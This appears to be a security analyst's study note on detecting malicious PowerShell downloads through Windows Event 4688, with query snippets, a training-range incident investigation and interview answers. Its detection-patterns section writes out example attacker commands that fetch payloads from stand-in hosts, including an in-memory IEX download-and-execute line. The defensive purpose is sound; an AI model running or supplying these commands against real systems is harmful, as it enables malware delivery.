\## ‚ö†Ô∏è CRITICAL: ExecutionPolicy Bypass Clarification



\*\*COMMON MISCONCEPTION:\*\*



Many security professionals believe `-ExecutionPolicy Bypass` allows PowerShell to evade antivirus or EDR detection. \*\*THIS IS INCORRECT.\*\*



\### What ExecutionPolicy Bypass Actually Does:



‚úÖ \*\*ONLY disables:\*\* PowerShell script signing policy  

‚úÖ \*\*Allows:\*\* Running unsigned scripts without prompt  

‚ùå \*\*DOES NOT bypass:\*\* Windows Defender, EDR, antivirus, firewalls  

‚ùå \*\*DOES NOT hide:\*\* Command-line logging, process creation events  

‚ùå \*\*DOES NOT prevent:\*\* AMSI (Antimalware Scan Interface) inspection



\### What Still Detects Malicious Activity:



\- \*\*Windows Defender:\*\* Scans downloaded files regardless of ExecutionPolicy

\- \*\*EDR Solutions:\*\* Monitor process behavior, network connections

\- \*\*Event ID 4688:\*\* Logs full command line with ExecutionPolicy flag visible

\- \*\*AMSI:\*\* Inspects PowerShell script content at runtime



\*\*Interview Talking Point:\*\*  

"I clarified in my incident investigation that ExecutionPolicy Bypass is often misunderstood. It only affects PowerShell's script signing policy, not security controls. This is why command-line logging via Event 4688 is critical - it captures the full execution context regardless of ExecutionPolicy settings."

\## üìä Detection Patterns



\### High-Risk Command Patterns



\*\*Pattern 1: Direct File Download\*\*

```powershell

powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'C:\\temp\\malware.exe'"

```



\*\*Pattern 2: In-Memory Execution (IEX)\*\*

```powershell

powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"

```



\*\*Pattern 3: Encoded Command\*\*

```powershell

powershell.exe -EncodedCommand <Base64String>

```

\*Note: Requires decoding to inspect actual command\*



\*\*Pattern 4: BITS Transfer (Stealthy)\*\*

```powershell

Import-Module BitsTransfer; Start-BitsTransfer -Source "http://evil.com/payload" -Destination "C:\\temp\\file.exe"

```



\### Legitimate Use Cases (Whitelist Candidates)



\*\*System Administration:\*\*

\- Windows Update downloads

\- Microsoft Office updates

\- IT management scripts from corporate domains



\*\*Development:\*\*

\- Package manager downloads (chocolatey, npm)

\- GitHub repository clones

\- Internal corporate script repositories



\*\*Recommended Whitelist Domains:\*\*

\- `\*.microsoft.com`

\- `\*.windowsupdate.com`

\- `\*.github.com` (if company uses GitHub)

\- `\*.<your-company-domain>.com`

```



\### Splunk Enhancements



\*\*Add Command Length Analysis:\*\*

```spl

| eval CommandLength=len(Process\_Command\_Line)

| where CommandLength > 500  // Suspicious if very long (obfuscation)

```



\*\*Add URL Extraction:\*\*

```spl

| rex field=Process\_Command\_Line "(?<URL>https?://\[^\\s]+)"

| table \_time, Account\_Name, URL, Process\_Command\_Line

```

\## üö® False Positive Management



\### Common False Positives



\*\*1. IT Admin Scripts\*\*

\- \*\*Scenario:\*\* Admins downloading tools from vendor sites

\- \*\*Solution:\*\* Whitelist known admin accounts or approved vendor domains

\- \*\*KQL Enhancement:\*\* `| where Account !in ("admin-user1", "admin-user2")`



\*\*2. Software Deployment Scripts\*\*

\- \*\*Scenario:\*\* SCCM/Intune scripts downloading installers

\- \*\*Solution:\*\* Whitelist deployment service accounts

\- \*\*KQL Enhancement:\*\* `| where Account !startswith "svc-deploy"`



\*\*3. Developer Workstations\*\*

\- \*\*Scenario:\*\* Developers using PowerShell for package management

\- \*\*Solution:\*\* Separate detection threshold for dev environments

\- \*\*KQL Enhancement:\*\* `| where Computer !has "DEV-"`



\### Enhanced Detection Logic



```kql

// Version 2: Risk-Based PowerShell Detection

let AdminAccounts = datatable(Account:string) \[

&nbsp;   "DOMAIN\\\\admin-user1",

&nbsp;   "DOMAIN\\\\admin-user2"

];

\## üìä Investigation Workflow - PICERL Applied



\*\*This detection rule triggered \[Incident #193653](../investigations/incident-193653-powershell-web-request.md). Here's how the investigation unfolded:\*\*



\### PREPARE

\- Alert details: HIGH severity, PowerShell web request to external URL

\- Detection rule: Event ID 4688 with ProcessCommandLine analysis

\- Required tools: Log Analytics, MITRE ATT\&CK reference



\### IDENTIFY

\*\*Key Evidence from Event 4688:\*\*

```

ProcessCommandLine: powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://testdomain.com/eicar.txt' -OutFile 'C:\\temp\\test.txt'"

Account: user123

Computer: DESKTOP-TEST-01

ParentProcessName: explorer.exe (user-initiated)

```



\*\*Analysis:\*\*

\- EICAR test file = training exercise indicator

\- Test username + test computer = cyber range environment

\- 5-minute burst = anomalous but controlled



\### CONTAIN

\*\*Decision Factors:\*\*

\- Environment: LAW-Cyber-Range (training)

\- Indicators: EICAR test file, test naming conventions

\- Risk: Low (training exercise)



\*\*Production Response Would Be:\*\*

\- Isolate endpoint immediately

\- Disable user account

\- Block external domain at firewall/proxy



\### ERADICATE

\*\*Training Context:\*\* No eradication needed



\*\*Production Actions Would Include:\*\*

\- Remove downloaded files

\- Check for persistence mechanisms

\- Scan for additional malware



\### RECOVER

\*\*Verified:\*\*

\- No lateral movement (Event 4624 network logons)

\- No persistence (Event 4720, 4728)

\- No privilege escalation



\### LESSONS LEARNED

\*\*Key Takeaway:\*\* Command-line logging (Event 4688 with ProcessCommandLine) was absolutely critical. Without it, we'd only see "powershell.exe" with no context.



\*\*Group Policy Requirement:\*\*

```

Computer Configuration ‚Üí Policies ‚Üí Administrative Templates ‚Üí System ‚Üí Audit Process Creation

‚Üí "Include command line in process creation events" = ENABLED

```

\## üéì Interview Talking Points



\### Question: "Walk me through investigating a PowerShell alert"



\*\*Answer (Reference Incident #193653):\*\*



"I received a HIGH severity alert for PowerShell Invoke-WebRequest activity. I used the PICERL framework for systematic investigation.



First, I queried Event ID 4688 in Log Analytics to get the full command line. This showed me the exact PowerShell command - it was downloading from an external domain with ExecutionPolicy Bypass.



I clarified that ExecutionPolicy Bypass does NOT bypass antivirus - common misconception. It only disables PowerShell script signing checks.



Then I checked for lateral movement using Event 4624 network logons - nothing found. Checked for persistence with Event 4720 and 4728 - no new accounts or privilege escalation.



The key evidence that made me confident this was a training exercise: EICAR test file in the URL, username 'user123', computer name 'DESKTOP-TEST-01', and the LAW-Cyber-Range environment context. All five indicators aligned.



In production, I would have contained immediately - isolated the endpoint, disabled the account, blocked the domain. But with training confirmed, I documented it as a lessons-learned exercise."



\### Question: "How does this rule work in Securonix?"



\*\*Answer:\*\*



"In Sentinel, I use KQL to query SecurityEvent table for Event 4688. In Securonix, I'd query their normalized process creation logs using their correlation search language.



The field names differ - Sentinel calls it ProcessCommandLine, Securonix might call it CommandLine or process\_cmdline - but the logic is the same: filter for powershell.exe + web download commands + external URLs.



The detection rule would use Securonix's threat model with similar correlation logic. Same investigation queries, same timeline reconstruction, same lateral movement checks - just different query syntax.



The investigation methodology is platform-agnostic - PICERL framework applies whether I'm using Sentinel, Splunk, or Securonix."



\### Question: "What would you do differently in production?"



\*\*Answer:\*\*



"Three key changes:



1\. \*\*Immediate containment:\*\* Don't wait for full investigation. Isolate first, investigate after.



2\. \*\*Automated response:\*\* Use SOAR playbook to automatically disable account and block IP when HIGH severity PowerShell alerts fire on production assets.



3\. \*\*Enhanced logging:\*\* Ensure PowerShell module logging and script block logging are enabled in addition to command-line logging for deeper forensics.



4\. \*\*Threat intelligence enrichment:\*\* Automatically check downloaded URL against threat intel feeds (VirusTotal, AbuseIPDB) before manual investigation."
